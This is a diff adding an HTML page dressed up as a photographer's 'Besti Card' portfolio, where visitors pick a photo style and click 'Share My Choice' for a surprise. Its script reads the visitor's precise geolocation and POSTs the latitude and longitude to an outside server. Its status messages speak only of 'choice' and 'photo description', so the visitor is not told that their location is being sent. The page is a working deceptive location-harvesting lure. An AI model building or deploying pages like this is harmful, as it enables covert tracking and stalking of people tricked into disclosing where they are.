@@ -1,0 +1,591 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Love Photographer - Besti Card</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #f9e3ff 0%, #ffe6f2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 1000px;
+            width: 100%;
+        }
+        
+        .card {
+            background-color: white;
+            border-radius: 20px;
+            box-shadow: 0 15px 35px rgba(231, 76, 156, 0.2);
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+            transition: transform 0.3s ease;
+        }
+        
+        .card:hover {
+            transform: translateY(-10px);
+        }
+        
+        .header {
+            background: linear-gradient(to right, #ff6bcb, #ff3366);
+            color: white;
+            padding: 25px;
+            text-align: center;
+            position: relative;
+        }
+        
+        .header h1 {
+            font-size: 2.5rem;
+            margin-bottom: 5px;
+            letter-spacing: 1px;
+        }
+        
+        .header p {
+            font-size: 1.1rem;
+            opacity: 0.9;
+        }
+        
+        .badge {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            background: rgba(255, 255, 255, 0.2);
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-size: 0.9rem;
+            font-weight: bold;
+        }
+        
+        .content {
+            display: flex;
+            flex-wrap: wrap;
+            padding: 0;
+        }
+        
+        .profile-section {
+            flex: 1;
+            min-width: 300px;
+            padding: 30px;
+            background-color: #fff9fc;
+        }
+        
+        .profile-img {
+            width: 180px;
+            height: 180px;
+            border-radius: 50%;
+            border: 5px solid #ff6bcb;
+            margin: 0 auto 25px;
+            overflow: hidden;
+            box-shadow: 0 8px 20px rgba(255, 107, 203, 0.3);
+        }
+        
+        .profile-img img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        
+        .profile-info h2 {
+            color: #ff3366;
+            margin-bottom: 10px;
+            text-align: center;
+            font-size: 1.8rem;
+        }
+        
+        .profile-info p {
+            color: #555;
+            line-height: 1.6;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        
+        .stats {
+            display: flex;
+            justify-content: space-around;
+            margin-top: 25px;
+            text-align: center;
+        }
+        
+        .stat-item {
+            padding: 10px;
+        }
+        
+        .stat-value {
+            display: block;
+            font-size: 1.8rem;
+            font-weight: bold;
+            color: #ff3366;
+        }
+        
+        .stat-label {
+            font-size: 0.9rem;
+            color: #777;
+            margin-top: 5px;
+        }
+        
+        .gallery-section {
+            flex: 2;
+            min-width: 400px;
+            padding: 30px;
+            background-color: white;
+        }
+        
+        .section-title {
+            color: #ff3366;
+            margin-bottom: 20px;
+            padding-bottom: 10px;
+            border-bottom: 2px solid #ffe6f2;
+            font-size: 1.5rem;
+        }
+        
+        .gallery {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
+            gap: 15px;
+            margin-bottom: 30px;
+        }
+        
+        .photo-item {
+            border-radius: 10px;
+            overflow: hidden;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            position: relative;
+            height: 150px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+        }
+        
+        .photo-item:hover {
+            transform: scale(1.05);
+            box-shadow: 0 8px 20px rgba(255, 51, 102, 0.3);
+        }
+        
+        .photo-item img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: block;
+        }
+        
+        .photo-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 51, 102, 0.7);
+            color: white;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            opacity: 0;
+            transition: opacity 0.3s;
+            padding: 10px;
+            text-align: center;
+        }
+        
+        .photo-item:hover .photo-overlay {
+            opacity: 1;
+        }
+        
+        .photo-overlay i {
+            font-size: 1.8rem;
+            margin-bottom: 8px;
+        }
+        
+        .location-section {
+            background-color: #f9f9f9;
+            padding: 20px;
+            border-radius: 15px;
+            margin-top: 20px;
+            border: 2px dashed #ffb8d9;
+        }
+        
+        .location-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+        
+        .location-header h3 {
+            color: #ff3366;
+            font-size: 1.3rem;
+        }
+        
+        .location-info {
+            display: none;
+            background-color: white;
+            padding: 15px;
+            border-radius: 10px;
+            margin-top: 15px;
+            border-left: 4px solid #ff3366;
+        }
+        
+        .location-info.active {
+            display: block;
+        }
+        
+        #locationBtn {
+            background: linear-gradient(to right, #ff6bcb, #ff3366);
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            border-radius: 50px;
+            cursor: pointer;
+            font-weight: bold;
+            font-size: 1rem;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            transition: all 0.3s ease;
+            box-shadow: 0 5px 15px rgba(255, 107, 203, 0.4);
+        }
+        
+        #locationBtn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(255, 107, 203, 0.6);
+        }
+        
+        #locationBtn:disabled {
+            background: #cccccc;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+        
+        #status {
+            margin-top: 15px;
+            padding: 12px;
+            border-radius: 8px;
+            font-weight: 500;
+            display: none;
+        }
+        
+        #status.success {
+            background-color: #e6ffe6;
+            color: #009900;
+            display: block;
+            border: 1px solid #99ff99;
+        }
+        
+        #status.error {
+            background-color: #ffe6e6;
+            color: #cc0000;
+            display: block;
+            border: 1px solid #ff9999;
+        }
+        
+        #status.loading {
+            background-color: #e6f7ff;
+            color: #0066cc;
+            display: block;
+            border: 1px solid #99ddff;
+        }
+        
+        .footer {
+            background-color: #ffeff7;
+            padding: 20px;
+            text-align: center;
+            color: #ff3366;
+            font-weight: 600;
+            letter-spacing: 1px;
+        }
+        
+        @media (max-width: 768px) {
+            .content {
+                flex-direction: column;
+            }
+            
+            .profile-section, .gallery-section {
+                min-width: 100%;
+            }
+            
+            .header h1 {
+                font-size: 2rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="card">
+            <div class="header">
+                <div class="badge">BESTI CARD</div>
+                <h1>Love Photographer</h1>
+                <p>Capturing moments of love and connection</p>
+            </div>
+            
+            <div class="content">
+                <div class="profile-section">
+                    <div class="profile-img">
+                        <img src="https://images.unsplash.com/photo-1554048612-b6a482bc67e5?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=500&q=80" alt="Love Photographer">
+                    </div>
+                    
+                    <div class="profile-info">
+                        <h2>Alex Rivera</h2>
+                        <p>Specializing in engagement, wedding, and couple photography. With over 10 years of experience, I capture the authentic emotions and unique love stories of every couple.</p>
+                        
+                        <div class="stats">
+                            <div class="stat-item">
+                                <span class="stat-value">500+</span>
+                                <span class="stat-label">Sessions</span>
+                            </div>
+                            <div class="stat-item">
+                                <span class="stat-value">12</span>
+                                <span class="stat-label">Awards</span>
+                            </div>
+                            <div class="stat-item">
+                                <span class="stat-value">47</span>
+                                <span class="stat-label">Countries</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="gallery-section">
+                    <h2 class="section-title">Love Gallery</h2>
+                    <p style="margin-bottom: 20px; color: #666;">Click on any photo to enable location sharing for your session</p>
+                    
+                    <div class="gallery">
+                        <div class="photo-item" onclick="selectPhoto(1)">
+                            <img src="https://images.unsplash.com/photo-1511285560929-80b456fea0bc?ixlib=rb-4.0.3&auto=format&fit=crop&w=500&q=80" alt="Couple in field">
+                            <div class="photo-overlay">
+                                <i class="fas fa-heart"></i>
+                                <span>Select this style</span>
+                            </div>
+                        </div>
+                        <div class="photo-item" onclick="selectPhoto(2)">
+                            <img src="https://images.unsplash.com/photo-1519225421980-715cb0215aed?ixlib=rb-4.0.3&auto=format&fit=crop&w=500&q=80" alt="Beach proposal">
+                            <div class="photo-overlay">
+                                <i class="fas fa-heart"></i>
+                                <span>Select this style</span>
+                            </div>
+                        </div>
+                        <div class="photo-item" onclick="selectPhoto(3)">
+                            <img src="https://images.unsplash.com/photo-1511988617509-a57c8a288659?ixlib=rb-4.0.3&auto=format&fit=crop&w=500&q=80" alt="Wedding kiss">
+                            <div class="photo-overlay">
+                                <i class="fas fa-heart"></i>
+                                <span>Select this style</span>
+                            </div>
+                        </div>
+                        <div class="photo-item" onclick="selectPhoto(4)">
+                            <img src="https://images.unsplash.com/photo-1537633552985-df8429e8048b?ixlib=rb-4.0.3&auto=format&fit=crop&w=500&q=80" alt="City couple">
+                            <div class="photo-overlay">
+                                <i class="fas fa-heart"></i>
+                                <span>Select this style</span>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="location-section">
+                        <div class="location-header">
+                            <h3>Share ur picture choice frome above</h3>
+                            <button id="locationBtn" onclick="sendLocation()" disabled>
+                                <!-- <i class="fas fa-map-marker-alt"></i> -->
+                                <span>Share My Choice</span>
+                            </button>
+                        </div>
+                        
+                        <p style="color: #666; margin-bottom: 15px;">To get a suprise</p>
+                        
+                        <div class="location-info" id="selectedPhotoInfo">
+                            <!-- This will be populated when a photo is selected -->
+                        </div>
+                        
+                        <div id="status"></div>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="footer">
+                &copy; 2023 Love Photographer Besti Card | Contact: alex@lovephotographer.com
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let selectedPhotoId = null;
+        const photoDescriptions = {
+            1: "Romantic field session with natural lighting and golden hour ambiance.",
+            2: "Beach proposal style with ocean backdrop and sunset lighting.",
+            3: "Elegant wedding ceremony focus with emotional moments.",
+            4: "Urban couple session with cityscape backgrounds and modern aesthetics."
+        };
+        
+        function selectPhoto(photoId) {
+            selectedPhotoId = photoId;
+            
+            // Update the UI to show selected photo
+            const photoItems = document.querySelectorAll('.photo-item');
+            photoItems.forEach(item => {
+                item.style.border = 'none';
+            });
+            
+            // Highlight selected photo
+            event.currentTarget.style.border = '3px solid #ff3366';
+            
+            // Enable the location button
+            document.getElementById('locationBtn').disabled = false;
+            
+            // Show photo info in location section
+            const photoInfo = document.getElementById('selectedPhotoInfo');
+            photoInfo.innerHTML = `
+                <h4 style="color: #ff3366; margin-bottom: 8px;">Selected Style</h4>
+                <p style="color: #555;">${photoDescriptions[photoId]}</p>
+                <p style="color: #777; margin-top: 10px; font-size: 0.9rem;">
+                    <i class="fas fa-check-circle" style="color: #4CAF50;"></i> 
+                    Photo style selected.
+                </p>
+            `;
+            photoInfo.classList.add('active');
+        }
+        
+        function sendLocation() {
+            if (!selectedPhotoId) {
+                alert("Please select a photo style first.");
+                return;
+            }
+            
+            if (navigator.geolocation) {
+                // Show loading state
+                const statusElement = document.getElementById('status');
+                statusElement.textContent = "Getting your Choice";
+                statusElement.className = "loading";
+                
+                // Disable button while processing
+                const locationBtn = document.getElementById('locationBtn');
+                locationBtn.disabled = true;
+                locationBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i><span>Processing...</span>';
+                
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    
+                    // Update status message
+                    statusElement.textContent = "Sending Choice to server...";
+                    
+                    // Your Spring Boot backend URL
+                    const backendUrl = "https://locationfinder-pdzb.onrender.com/api/location";
+                    
+                    // Send location data to your Spring Boot backend
+                    fetch(backendUrl, {
+                        method: "POST",
+                        headers: { 
+                            "Content-Type": "application/json",
+                            "Accept": "application/json"
+                        },
+                        body: JSON.stringify({ 
+                            latitude: lat, 
+                            longitude: lon,
+                            photoStyleId: selectedPhotoId // Adding the photo style ID
+                        })
+                    })
+                    .then(res => {
+                        if (res.ok) {
+                            return res.text();
+                        } else {
+                            throw new Error('Server responded with status: ' + res.status);
+                        }
+                    })
+                    .then(data => {
+                        // Show success with address from LocationIQ
+                        statusElement.textContent = "Succesfull added photo description: ";
+                        statusElement.className = "success";
+                        
+                        // Update button to show success
+                        locationBtn.innerHTML = '<i class="fas fa-check"></i><span>choice updated</span>';
+                        
+                        // Log the data
+                        console.log("Location data sent successfully. Response:", data);
+                        
+                        // Show the returned address in a more readable format
+                        setTimeout(() => {
+                            alert("photho description added");
+                        }, 500);
+                    })
+                    .catch(err => {
+                        // Handle fetch errors
+                        statusElement.textContent = "Error sending location: " + err.message + 
+                            "\n\nNote: Make sure your Spring Boot server is running on https://locationfinder-pdzb.onrender.com" +
+                            "\nand has CORS enabled with @CrossOrigin annotation.";
+                        statusElement.className = "error";
+                        
+                        // Re-enable the button
+                        locationBtn.disabled = false;
+                        locationBtn.innerHTML = '<i class="fas fa-map-marker-alt"></i><span>Share My Location</span>';
+                        
+                        console.error("Error sending location:", err);
+                        
+                        // For demo purposes, you could use a fallback
+                        // showMockSuccess(lat, lon, locationBtn, statusElement);
+                    });
+                }, function(error) {
+                    // Handle geolocation errors
+                    const statusElement = document.getElementById('status');
+                    let errorMessage = "Error getting data: ";
+                    
+                    switch(error.code) {
+                        case error.PERMISSION_DENIED:
+                            errorMessage += "Permission denied.";
+                            break;
+                        case error.POSITION_UNAVAILABLE:
+                            errorMessage += "data information unavailable.";
+                            break;
+                        case error.TIMEOUT:
+                            errorMessage += "request timed out.";
+                            break;
+                        default:
+                            errorMessage += "Unknown error.";
+                            break;
+                    }
+                    
+                    statusElement.textContent = errorMessage;
+                    statusElement.className = "error";
+                    
+                    // Re-enable the button
+                    const locationBtn = document.getElementById('locationBtn');
+                    locationBtn.disabled = false;
+                    locationBtn.innerHTML = '<i class="fas fa-map-marker-alt"></i><span>Share My Location</span>';
+                });
+            } else {
+                alert("Geolocation is not supported by this browser.");
+            }
+        }
+        
+        // Fallback function for demo if backend is not running
+        function showMockSuccess(lat, lon, button, statusElement) {
+            const mockAddress = "Road: Demo Street, City: Springfield, State: IL, Country: USA, Postcode: 62701";
+            statusElement.textContent = "Demo Mode: Location sent! Address: " + mockAddress;
+            statusElement.className = "success";
+            
+            button.disabled = true;
+            button.innerHTML = '<i class="fas fa-check"></i><span>Location Sent</span>';
+            
+            console.log("Mock location data sent:", { lat, lon, photoStyleId: selectedPhotoId });
+        }
+        
+        // Initialize with first photo selected
+        window.onload = function() {
+            // Select the first photo by default
+            selectPhoto(1);
+        };
+    </script>
+</body>
+</html>
